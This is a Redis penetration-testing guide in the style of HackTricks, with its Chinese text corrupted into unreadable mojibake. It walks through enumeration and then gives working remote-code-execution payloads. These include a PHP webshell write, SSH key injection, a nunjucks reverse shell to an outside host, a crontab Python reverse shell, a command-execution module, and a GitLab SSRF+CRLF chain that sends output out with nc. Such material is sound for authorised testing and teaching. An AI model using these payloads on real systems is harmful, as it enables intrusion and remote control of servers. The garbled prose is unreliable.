# 6379 - Redis æ¸—é€æµ‹è¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢è¡Œä¸ºçš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£åŠæ—¶äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„èµé‡‘è®¡åˆ’å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼ 

## åŸºæœ¬ä¿¡æ¯

æ ¹æ®[æ–‡æ¡£](https://redis.io/topics/introduction)ï¼šRedis æ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSD è®¸å¯ï¼‰ï¼Œç”¨ä½œ**æ•°æ®åº“**ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†çš„**å†…å­˜æ•°æ®ç»“æ„å­˜å‚¨**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedis ä½¿ç”¨åŸºäºçº¯æ–‡æœ¬çš„åè®®ï¼Œä½†æ‚¨å¿…é¡»è®°ä½å®ƒä¹Ÿå¯ä»¥å®ç°**ssl/tls**ã€‚äº†è§£å¦‚ä½•[åœ¨è¿™é‡Œä½¿ç”¨ ssl/tls è¿è¡Œ Redis](https://fossies.org/linux/redis/TLS.md)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## è‡ªåŠ¨æšä¸¾

ä¸€äº›è‡ªåŠ¨åŒ–å·¥å…·å¯ä»¥å¸®åŠ©è·å–æ¥è‡ª Redis å®ä¾‹çš„ä¿¡æ¯ï¼š
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## æ‰‹åŠ¨æšä¸¾

### æ¨ªå¹…

Redisæ˜¯ä¸€ç§åŸºäº**æ–‡æœ¬çš„åè®®**ï¼Œæ‚¨å¯ä»¥åªéœ€**åœ¨å¥—æ¥å­—ä¸­å‘é€å‘½ä»¤**ï¼Œè¿”å›çš„å€¼å°±å¯ä»¥è¢«è¯»å–ã€‚è¿˜è¦è®°ä½Rediså¯ä»¥ä½¿ç”¨**ssl/tls**è¿è¡Œï¼ˆä½†è¿™å¾ˆå¥‡æ€ªï¼‰ã€‚

åœ¨å¸¸è§„Rediså®ä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`nc`è¿›è¡Œè¿æ¥ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨`redis-cli`ï¼š
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
æ‚¨å¯ä»¥å°è¯•çš„**ç¬¬ä¸€ä¸ªå‘½ä»¤**æ˜¯**`info`**ã€‚å®ƒå¯èƒ½ä¼šè¿”å›Rediså®ä¾‹çš„ä¿¡æ¯ï¼Œæˆ–è€…å¯èƒ½ä¼šè¿”å›ç±»ä¼¼ä»¥ä¸‹å†…å®¹çš„ä¿¡æ¯ï¼š
```
-NOAUTH Authentication required.
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™æ„å‘³ç€**æ‚¨éœ€è¦æœ‰æ•ˆçš„å‡­æ®**æ‰èƒ½è®¿é—®Rediså®ä¾‹ã€‚

### Redisèº«ä»½éªŒè¯

**é»˜è®¤æƒ…å†µä¸‹**ï¼ŒRediså¯ä»¥åœ¨**æ²¡æœ‰å‡­æ®**çš„æƒ…å†µä¸‹è®¿é—®ã€‚ä½†æ˜¯ï¼Œå®ƒå¯ä»¥è¢«**é…ç½®**ä¸ºä»…æ”¯æŒ**å¯†ç ï¼Œæˆ–ç”¨æˆ·å+å¯†ç **ã€‚\
å¯ä»¥åœ¨_**redis.conf**_æ–‡ä»¶ä¸­ä½¿ç”¨å‚æ•°`requirepass`**è®¾ç½®å¯†ç **ï¼Œæˆ–è€…åœ¨æœåŠ¡é‡æ–°å¯åŠ¨è¿æ¥åˆ°å®ƒå¹¶è¿è¡Œ`config set requirepass p@ss$12E45`æ¥**ä¸´æ—¶è®¾ç½®**å¯†ç ã€‚\
æ­¤å¤–ï¼Œå¯ä»¥åœ¨_**redis.conf**_æ–‡ä»¶ä¸­çš„å‚æ•°`masteruser`ä¸­é…ç½®**ç”¨æˆ·å**ã€‚

{% hint style="info" %}
å¦‚æœä»…é…ç½®äº†å¯†ç ï¼Œåˆ™ä½¿ç”¨çš„ç”¨æˆ·åæ˜¯â€œ**default**â€ã€‚\
å¦å¤–ï¼Œè¯·æ³¨æ„**å¤–éƒ¨æ— æ³•æ‰¾åˆ°**Redisæ˜¯ä»…é…ç½®äº†å¯†ç è¿˜æ˜¯ç”¨æˆ·å+å¯†ç ã€‚
{% endhint %}

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†**éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„å‡­æ®**æ‰èƒ½ä¸Redisäº¤äº’ï¼Œå› æ­¤å¯ä»¥å°è¯•[**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#redis)ã€‚\
**å¦‚æœæ‰¾åˆ°æœ‰æ•ˆå‡­æ®ï¼Œéœ€è¦åœ¨ä¸å‘½ä»¤å»ºç«‹è¿æ¥åè¿›è¡Œèº«ä»½éªŒè¯çš„ä¼šè¯ä¸­è¿›è¡Œèº«ä»½éªŒè¯**ï¼š
```bash
AUTH <username> <password>
```
**æœ‰æ•ˆå‡­æ®** å°†ä¼šå¾—åˆ°ä»¥ä¸‹å›åº”ï¼š`+OK`

### **å·²è®¤è¯æšä¸¾**

å¦‚æœ Redis æœåŠ¡å™¨å…è®¸**åŒ¿åè¿æ¥**æˆ–è€…æ‚¨å·²è·å¾—æœ‰æ•ˆå‡­æ®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹**å‘½ä»¤**å¯åŠ¨æœåŠ¡çš„æšä¸¾è¿‡ç¨‹ï¼š
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**å…¶ä»–Rediså‘½ä»¤** [**å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°**](https://redis.io/topics/data-types-intro) **å’Œ** [**è¿™é‡Œ**](https://lzone.de/cheat-sheet/Redis)**ã€‚**

è¯·æ³¨æ„ï¼Œ**å®ä¾‹çš„Rediså‘½ä»¤å¯ä»¥åœ¨_redis.conf_æ–‡ä»¶ä¸­é‡å‘½å**æˆ–åˆ é™¤ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹è¡Œå°†åˆ é™¤FLUSHDBå‘½ä»¤ï¼š
```
rename-command FLUSHDB ""
```
æ›´å¤šå…³äºå¦‚ä½•å®‰å…¨é…ç½®RedisæœåŠ¡çš„ä¿¡æ¯è¯·æŸ¥çœ‹ï¼š[https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å‘½ä»¤`monitor`å®æ—¶ç›‘è§†æ‰§è¡Œçš„Rediså‘½ä»¤ï¼Œæˆ–è€…ä½¿ç”¨`slowlog get 25`è·å–å‰25ä¸ªæœ€æ…¢çš„æŸ¥è¯¢ã€‚

åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šå…³äºRediså‘½ä»¤çš„æœ‰è¶£ä¿¡æ¯ï¼š[https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **è½¬å‚¨æ•°æ®åº“**

åœ¨Redisä¸­ï¼Œ**æ•°æ®åº“æ˜¯ä»0å¼€å§‹ç¼–å·çš„æ•°å­—**ã€‚æ‚¨å¯ä»¥åœ¨`info`å‘½ä»¤çš„è¾“å‡ºä¸­çš„"Keyspace"å—ä¸­æ‰¾åˆ°æ˜¯å¦æœ‰ä»»ä½•æ•°æ®åº“æ­£åœ¨ä½¿ç”¨ï¼š

![](<../.gitbook/assets/image (766).png>)

æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–æ‰€æœ‰**keyspaces**ï¼ˆæ•°æ®åº“ï¼‰ï¼š
```
INFO keyspace
```
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ­£åœ¨ä½¿ç”¨**æ•°æ®åº“ 0 å’Œ 1**ã€‚**æ•°æ®åº“ 0 åŒ…å« 4 ä¸ªé”®ï¼Œæ•°æ®åº“ 1 åŒ…å« 1 ä¸ª**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedis å°†ä½¿ç”¨æ•°æ®åº“ 0ã€‚è¦å¯¼å‡ºä¾‹å¦‚æ•°æ®åº“ 1ï¼Œæ‚¨éœ€è¦æ‰§è¡Œï¼š
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
åœ¨è¿è¡Œ `GET <KEY>` æ—¶ï¼Œå¦‚æœå‡ºç° `-WRONGTYPE æ“ä½œé’ˆå¯¹ä¿å­˜äº†é”™è¯¯ç±»å‹å€¼çš„é”®` é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºè¯¥é”®å¯èƒ½ä¸æ˜¯å­—ç¬¦ä¸²æˆ–æ•´æ•°ï¼Œéœ€è¦ä½¿ç”¨ç‰¹æ®Šè¿ç®—ç¬¦æ¥æ˜¾ç¤ºå®ƒã€‚

è¦äº†è§£é”®çš„ç±»å‹ï¼Œè¯·ä½¿ç”¨ `TYPE` å‘½ä»¤ï¼Œä»¥ä¸‹æ˜¯åˆ—è¡¨å’Œå“ˆå¸Œé”®çš„ç¤ºä¾‹ã€‚
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**ä½¿ç”¨npm** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **æˆ–python** [**redis-utils**](https://pypi.org/project/redis-utils/) **æ¥è½¬å‚¨æ•°æ®åº“**

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢è¡Œä¸ºçš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£åŠæ—¶äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„èµé‡‘ä»»åŠ¡å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

åŠ å…¥æˆ‘ä»¬çš„[**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œç«‹å³å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼ 

## Redis RCE

### äº¤äº’å¼Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) å¯ä»¥è‡ªåŠ¨åœ¨Redis(<=5.0.5)ä¸­è·å–äº¤äº’å¼Shellæˆ–åå‘Shellã€‚
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

ä¿¡æ¯æ¥è‡ª[**è¿™é‡Œ**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)ã€‚æ‚¨å¿…é¡»çŸ¥é“**ç½‘ç«™æ–‡ä»¶å¤¹çš„è·¯å¾„**ï¼š
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
### æ¨¡æ¿ Webshell

å°±åƒåœ¨å‰é¢çš„éƒ¨åˆ†ä¸­ä¸€æ ·ï¼Œæ‚¨è¿˜å¯ä»¥è¦†ç›–ä¸€äº›å°†ç”±æ¨¡æ¿å¼•æ“è§£é‡Šçš„ HTML æ¨¡æ¿æ–‡ä»¶å¹¶è·å– shellã€‚

ä¾‹å¦‚ï¼Œæ ¹æ®[**æ­¤è§£æ**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/)ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ”»å‡»è€…åœ¨ç”± **nunjucks æ¨¡æ¿å¼•æ“** è§£é‡Šçš„ HTML ä¸­æ³¨å…¥äº† **rev shell**ã€‚
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œ**å‡ ä¸ªæ¨¡æ¿å¼•æ“ä¼šç¼“å­˜**æ¨¡æ¿åœ¨**å†…å­˜**ä¸­ï¼Œå› æ­¤å³ä½¿æ‚¨è¦†ç›–å®ƒä»¬ï¼Œæ–°æ¨¡æ¿**ä¸ä¼šè¢«æ‰§è¡Œ**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦ä¹ˆå¼€å‘äººå‘˜ä¿ç•™äº†è‡ªåŠ¨é‡æ–°åŠ è½½åŠŸèƒ½ï¼Œè¦ä¹ˆæ‚¨éœ€è¦å¯¹æœåŠ¡è¿›è¡ŒDoSæ”»å‡»ï¼ˆå¹¶æœŸæœ›å®ƒå°†è‡ªåŠ¨é‡æ–°å¯åŠ¨ï¼‰ã€‚
{% endhint %}

### SSH

ç¤ºä¾‹[æ¥è‡ªè¿™é‡Œ](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

è¯·æ³¨æ„**`config get dir`**çš„ç»“æœå¯èƒ½ä¼šåœ¨å…¶ä»–æ‰‹åŠ¨åˆ©ç”¨å‘½ä»¤ä¹‹åå‘ç”Ÿæ›´æ”¹ã€‚å»ºè®®åœ¨ç™»å½•åˆ°Redisåç«‹å³è¿è¡Œå®ƒã€‚åœ¨**`config get dir`**çš„è¾“å‡ºä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**redisç”¨æˆ·**çš„**home**ï¼ˆé€šå¸¸ä¸º_/var/lib/redis_æˆ–_/home/redis/.ssh_ï¼‰ï¼ŒçŸ¥é“è¿™ä¸€ç‚¹åï¼Œæ‚¨å°±çŸ¥é“å¯ä»¥åœ¨å“ªé‡Œå†™å…¥`authenticated_users`æ–‡ä»¶ä»¥é€šè¿‡sshè®¿é—®**ä½¿ç”¨redisç”¨æˆ·**ã€‚å¦‚æœæ‚¨çŸ¥é“å…¶ä»–æœ‰æ•ˆç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œå¹¶ä¸”å…·æœ‰å¯å†™æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥æ»¥ç”¨å®ƒï¼š

1. åœ¨æ‚¨çš„è®¡ç®—æœºä¸Šç”Ÿæˆsshå…¬é’¥-ç§é’¥å¯¹ï¼š**`ssh-keygen -t rsa`**
2. å°†å…¬é’¥å†™å…¥æ–‡ä»¶ï¼š**`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. å°†æ–‡ä»¶å¯¼å…¥åˆ°redisï¼š**`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. å°†å…¬é’¥ä¿å­˜åˆ°redisæœåŠ¡å™¨ä¸Šçš„**authorized\_keys**æ–‡ä»¶ä¸­ï¼š

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. æœ€åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç§é’¥**ssh**åˆ°**redisæœåŠ¡å™¨**ï¼š**ssh -i id\_rsa redis@10.85.0.52**

**æ­¤æŠ€æœ¯åœ¨æ­¤å¤„è‡ªåŠ¨åŒ–ï¼š**[https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
æœ€åä¸€ä¸ªç¤ºä¾‹é€‚ç”¨äºUbuntuï¼Œå¯¹äº**Centos**ï¼Œä¸Šè¿°å‘½ä»¤åº”ä¸ºï¼š`redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨æ¥èµšå–æ¯”ç‰¹å¸ï¼š[yam](https://www.v2ex.com/t/286981#reply14)

### åŠ è½½Redisæ¨¡å—

1. æŒ‰ç…§[https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)çš„è¯´æ˜ï¼Œæ‚¨å¯ä»¥**ç¼–è¯‘ä¸€ä¸ªRedisæ¨¡å—æ¥æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚
2. ç„¶åéœ€è¦æŸç§æ–¹å¼**ä¸Šä¼ ç¼–è¯‘å¥½çš„**æ¨¡å—
3. åœ¨è¿è¡Œæ—¶**åŠ è½½ä¸Šä¼ çš„æ¨¡å—**ï¼š`MODULE LOAD /path/to/mymodule.so`
4. **åˆ—å‡ºå·²åŠ è½½çš„æ¨¡å—**ä»¥æ£€æŸ¥æ˜¯å¦å·²æ­£ç¡®åŠ è½½ï¼š`MODULE LIST`
5. **æ‰§è¡Œ** **å‘½ä»¤**ï¼š

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. æ‚¨å¯ä»¥éšæ—¶å¸è½½æ¨¡å—ï¼š`MODULE UNLOAD mymodule`

### LUAæ²™ç›’ç»•è¿‡

[**è¿™é‡Œ**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)æ‚¨å¯ä»¥çœ‹åˆ°Redisä½¿ç”¨**EVAL**å‘½ä»¤æ¥æ‰§è¡Œ**Luaä»£ç æ²™ç›’**ã€‚åœ¨é“¾æ¥çš„å¸–å­ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¦‚ä½•ä½¿ç”¨**dofile**å‡½æ•°æ»¥ç”¨å®ƒï¼Œä½†[æ˜¾ç„¶](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval)è¿™å·²ä¸å†å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œå¦‚æœæ‚¨å¯ä»¥**ç»•è¿‡Lua**æ²™ç›’ï¼Œå°±å¯ä»¥åœ¨ç³»ç»Ÿä¸Š**æ‰§è¡Œä»»æ„**å‘½ä»¤ã€‚æ­¤å¤–ï¼Œä»åŒä¸€å¸–å­ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¸€äº›**å¯¼è‡´DoS**çš„**é€‰é¡¹**ã€‚

ä¸€äº›**ç”¨äºç»•è¿‡LUA**çš„CVEï¼š

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### ä¸»ä»æ¨¡å—

ä¸»Redisçš„æ‰€æœ‰æ“ä½œä¼šè‡ªåŠ¨åŒæ­¥åˆ°ä»Redisï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†æ¼æ´Redisè§†ä¸ºä»Redisï¼Œè¿æ¥åˆ°æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ä¸»Redisï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨æˆ‘ä»¬è‡ªå·±çš„Redisä¸­è¾“å…¥å‘½ä»¤ã€‚
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF ä¸ Redis é€šä¿¡

å¦‚æœä½ å¯ä»¥å‘é€**æ˜æ–‡**è¯·æ±‚**åˆ° Redis**ï¼Œä½ å¯ä»¥ä¸å…¶**è¿›è¡Œé€šä¿¡**ï¼Œå› ä¸º Redis ä¼šé€è¡Œè¯»å–è¯·æ±‚ï¼Œå¹¶åªå¯¹å…¶ä¸ç†è§£çš„è¡Œä½œå‡ºé”™è¯¯å“åº”ï¼š
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
å› æ­¤ï¼Œå¦‚æœæ‚¨åœ¨ç½‘ç«™ä¸­å‘ç°äº†**SSRFæ¼æ´**ï¼Œå¹¶ä¸”å¯ä»¥**æ§åˆ¶**ä¸€äº›**æ ‡å¤´**ï¼ˆå¯èƒ½æ˜¯é€šè¿‡CRLFæ¼æ´ï¼‰æˆ–**POSTå‚æ•°**ï¼Œæ‚¨å°†èƒ½å¤Ÿå‘Rediså‘é€ä»»æ„å‘½ä»¤ã€‚

### ç¤ºä¾‹ï¼šGitlab SSRF + CRLF åˆ° Shell

åœ¨**Gitlab11.4.7**ä¸­å‘ç°äº†ä¸€ä¸ª**SSRF**æ¼æ´å’Œä¸€ä¸ª**CRLF**æ¼æ´ã€‚**SSRF**æ¼æ´å‡ºç°åœ¨**ä»URLåŠŸèƒ½å¯¼å…¥é¡¹ç›®**ä¸­ï¼Œå½“åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®æ—¶å…è®¸è®¿é—®ä»»æ„IPï¼Œå½¢å¼ä¸º\[0:0:0:0:0:ffff:127.0.0.1]ï¼ˆè¿™å°†è®¿é—®127.0.0.1ï¼‰ï¼Œè€Œ**CRLF**æ¼æ´åˆ™æ˜¯é€šè¿‡å‘**URL**æ·»åŠ **%0D%0A**å­—ç¬¦æ¥åˆ©ç”¨ã€‚

å› æ­¤ï¼Œå¯ä»¥**åˆ©ç”¨è¿™äº›æ¼æ´ä¸ç®¡ç†é˜Ÿåˆ—çš„Rediså®ä¾‹è¿›è¡Œé€šä¿¡**ï¼Œå¹¶æ»¥ç”¨è¿™äº›é˜Ÿåˆ—æ¥**æ‰§è¡Œä»£ç **ã€‚Redisé˜Ÿåˆ—æ»¥ç”¨çš„æœ‰æ•ˆè½½è·æ˜¯ï¼š
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
è€Œåˆ©ç”¨SSRFå’ŒCRLFæ»¥ç”¨URLç¼–ç è¯·æ±‚æ‰§è¡Œ`whoami`å¹¶é€šè¿‡`nc`å‘é€è¾“å‡ºçš„è¯·æ±‚æ˜¯ï¼š
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
ç”±äºæŸç§åŸå› ï¼ˆå°±åƒ[_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)çš„ä½œè€…æ‰€è¿°ï¼Œè¿™äº›ä¿¡æ¯æ¥æºäºé‚£é‡Œï¼‰ï¼Œåˆ©ç”¨ä½¿ç”¨`git`æ–¹æ¡ˆè€Œä¸æ˜¯`http`æ–¹æ¡ˆã€‚

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢è¡Œä¸ºçš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„èµé‡‘è®¡åˆ’å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°ä¿æŒä¿¡æ¯æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼ 

<details>

